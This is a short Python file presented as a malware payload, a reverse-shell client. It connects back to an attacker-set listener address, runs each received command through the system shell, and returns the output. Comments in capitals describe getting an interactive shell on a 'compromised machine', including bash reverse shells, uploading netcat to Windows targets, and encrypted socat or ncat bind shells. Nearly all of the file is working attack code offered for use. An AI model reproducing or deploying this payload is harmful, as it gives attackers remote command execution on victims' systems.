import socket
import subprocess

#============================================================================================
#                                   SIMEPLE PYTHON PAYLOAD
#
#                                       BY MALWAREMIX
#               THIS PART OF THE PYTHON PROGRAM IS THE CLIENT SIDE THAT WILL ME CONNECTING TO THE SERVER ITSSELF
# ONCE IN THE CONPROMIZED MACHINE WHAT IS BEST IS TO HAVE A ACTUAL SHELL INTO THE SYSTEM SINCE YOU ARE TECHNALLY IN THE SYSTEM THE PAYLOAD WAS EXECUTED ON
#   IF YOU ARE ON A LINUX OR "UNIX BASED SYSTEM" THE CLIENT YOU CAN JUST EXECUTE A SIMPLE BASH REVERSE SHELL AND BACKGROUND IT 
# OR IF ON A WINDOWS SYSTEM THEN WHAT YOU WOULD HAVE TO DO IS TAKE A NC OR "NETCAT BINARY" YOU CAN FIND IT ON GITHUB AND UPLOAD IT TO THE MACHINE
#                   ONCE UPLOADED TO THE MACHINE JUST START A NETCAT SESSION!
#   IF YOU WANT A SECURE AND ENCRYPTED SHELL WHAT IS BEST IS TO USE EITHER SOCAT OR NCAT ON BOTH ENDS AND MAKE A BIND SHELL
#   FOR NCAT YOU CAN MAKE AN ENCRYPTED SSL BIND SHELL!

# put your IP that your listener is listening on
REMOTE_HOST = '127.0.0.1'
REMOTE_PORT = 8081
client = socket.socket()
client.connect((REMOTE_HOST, REMOTE_PORT))

while True:
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    client.send(output + output_error)